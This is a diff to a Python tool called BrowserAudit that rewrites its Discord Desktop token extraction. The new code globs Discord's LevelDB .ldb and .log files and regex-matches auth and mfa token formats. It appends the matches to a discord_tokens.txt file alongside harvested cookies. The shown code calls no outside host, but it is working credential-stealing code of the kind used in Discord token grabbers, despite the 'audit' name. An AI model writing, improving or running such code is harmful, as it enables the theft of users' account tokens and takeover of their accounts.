@@ -8,13 +8,6 @@ import json
 from datetime import datetime
 from pathlib import Path
 
-# macOS: ensure leveldb library can be found by plyvel
-if sys.platform == 'darwin':
-    leveldb_lib_path = '/opt/homebrew/opt/leveldb/lib'
-    if os.path.exists(leveldb_lib_path):
-        dyld_path = os.environ.get('DYLD_LIBRARY_PATH', '')
-        os.environ['DYLD_LIBRARY_PATH'] = f"{leveldb_lib_path}:{dyld_path}" if dyld_path else leveldb_lib_path
-
 class BrowserAudit:
     COLORS = {
         'RESET': '\033[0m',
@@ -242,20 +235,8 @@ class BrowserAudit:
             print(f"{self.COLORS['GREEN']}[OK] Discord Web tokens extracted{self.COLORS['RESET']}\n")
 
     def extract_discord_tokens(self):
-        try:
-            import plyvel
-        except ImportError:
-            print(f"{self.COLORS['YELLOW']}[!] Discord Desktop tokens require plyvel library{self.COLORS['RESET']}")
-            print(f"{self.COLORS['YELLOW']}    Install with: pip install plyvel{self.COLORS['RESET']}\n")
-            self.log("WARNING", "plyvel not available - Discord Desktop token extraction skipped")
-            return
-
-        try:
-            import shutil
-            import tempfile
-        except ImportError:
-            self.log("ERROR", "Required libraries not available")
-            return
+        import glob
+        import re
 
         print(f"{self.COLORS['CYAN']}[*] Extracting Discord Desktop tokens...{self.COLORS['RESET']}")
         self.log("INFO", "Starting Discord Desktop token extraction")
@@ -276,64 +257,38 @@ class BrowserAudit:
             }
 
         found_any = False
-        checked_count = 0
+        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}'
 
         for app_name, discord_dir in discord_dirs.items():
-            self.log("INFO", f"Checking for {app_name} at {discord_dir}")
-
             if not discord_dir.exists():
-                self.log("INFO", f"{app_name} directory not found")
                 continue
 
-            checked_count += 1
             leveldb_path = discord_dir / "Local Storage/leveldb"
-
             if not leveldb_path.exists():
-                self.log("INFO", f"{app_name} LevelDB not found at {leveldb_path}")
                 continue
 
             try:
-                with tempfile.TemporaryDirectory() as tmpdir:
-                    temp_db = Path(tmpdir) / "leveldb"
-                    shutil.copytree(leveldb_path, temp_db)
-
-                    db = plyvel.DB(str(temp_db), create_if_missing=False)
-                    keys_found = []
-
-                    for key, value in db.iterator():
-                        key_str = key.decode('utf-8', errors='ignore')
-                        keys_found.append(key_str)
-
-                        if 'token' in key_str.lower() and 'discord' in key_str.lower():
-                            try:
-                                value_str = value.decode('utf-8', errors='ignore').strip('"')
-
-                                if len(value_str) > 50 and any(x in value_str for x in ['MjcyMjE', 'MzA', 'NzA', 'mfa.', 'dbl_']):
-                                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
-                                        f.write(f"[{app_name}] {value_str}\n")
-                                    found_any = True
-                                elif len(value_str) > 20:
-                                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
-                                        f.write(f"[{app_name}] (encrypted/obfuscated) {value_str[:50]}...\n")
-                                    found_any = True
-                            except:
-                                pass
-
-                    if not keys_found:
-                        self.log("INFO", f"{app_name} LevelDB exists but is empty or unreadable")
-                    else:
-                        self.log("INFO", f"{app_name} LevelDB has {len(keys_found)} keys")
-
-                    db.close()
+                for file in glob.glob(f"{leveldb_path}/*.ldb") + glob.glob(f"{leveldb_path}/*.log"):
+                    try:
+                        with open(file, 'r', encoding='ISO-8859-1') as f:
+                            content = f.read()
+                            tokens = re.findall(token_pattern, content)
+                            if tokens:
+                                with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
+                                    for token in set(tokens):
+                                        out.write(f"[{app_name}] {token}\n")
+                                found_any = True
+                    except:
+                        pass
             except Exception as e:
                 self.log("ERROR", f"Discord {app_name} extraction failed: {e}")
 
-        self.log("INFO", f"Discord extraction complete: checked {checked_count} installations, found tokens: {found_any}")
+        self.log("INFO", f"Discord extraction complete, found tokens: {found_any}")
 
         if found_any:
             print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
         else:
-            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (tokens may be encrypted){self.COLORS['RESET']}\n")
+            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found{self.COLORS['RESET']}\n")
 
     def filter_display_content(self, content, filename):
         if 'discord_tokens' in filename or 'discord_web' in filename:
